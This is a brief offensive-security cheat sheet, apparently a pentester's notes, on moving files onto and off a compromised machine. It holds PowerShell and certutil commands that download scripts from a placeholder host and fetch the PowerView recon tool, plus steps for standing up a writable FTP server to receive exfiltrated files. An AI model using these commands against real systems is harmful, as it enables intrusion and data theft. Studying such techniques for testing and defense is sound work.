# Techniques to Infil and Exfil Files

## Infil

```powershell
# Powershell
wget https://example.com/script.ps1 -o script.ps1
# OR
Invoke-WebRequest -OutFile PowerView.ps1 -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

# Certutil
certutil.exe -urlcache -f http://example.com/script.ps1 script.ps1
```

## Exfil

### Python3 pyftpdlib

On the machine you are exfilling to:  

```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -w --user=username --password=password
```
